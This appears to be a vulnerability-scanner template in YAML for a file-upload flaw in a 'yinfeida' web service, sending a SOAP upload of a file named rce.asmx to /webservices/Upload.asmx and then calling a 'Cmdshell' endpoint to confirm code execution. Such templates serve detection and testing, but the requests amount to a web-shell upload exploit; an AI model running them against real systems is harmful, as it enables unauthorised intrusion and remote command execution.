http:
    - raw:
        - |
          POST /webservices/Upload.asmx HTTP/1.1
          Host: {{Hostname}}
          SOAPAction: "http://tempuri.org/UploadData"
          Content-Type: text/xml; charset=utf-8

          <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>
          <UploadData xmlns="http://tempuri.org/">
          <guid>1</guid>
          <patientId>1</patientId>
          <patientName>1</patientName>
          <fileName>rce.asmx</fileName>
          <fileSize>1000</fileSize>
          <file></file>
          </UploadData>
          </soap:Body>
          </soap:Envelope>
    - matchers:
        - part: body
          type: word
          words:
            - Hello,World
        - negative: true
          part: body
          type: word
          words:
            - spool/1/rce.asmx/Cmdshell?Pass=Response.Write
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /spool/1/rce.asmx/Cmdshell?Pass=Response.Write("Hello,World") HTTP/1.1
          Host: {{Hostname}}
id: yinfeida-upload-File-upload
info:
